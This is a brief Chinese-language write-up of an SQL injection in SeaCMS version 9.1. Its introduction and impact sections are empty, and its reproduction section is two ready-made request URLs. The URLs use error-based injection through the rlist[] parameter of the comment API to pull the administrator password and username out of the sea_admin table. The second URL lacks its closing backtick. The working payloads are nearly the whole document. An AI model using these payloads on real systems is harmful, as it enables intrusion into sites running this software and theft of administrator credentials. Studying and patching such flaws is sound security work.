Seacms V9.1 版本SQL注入
=======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

获取管理员表中第一个用户的密码

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`

获取管理员表中第一个用户的账号

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27
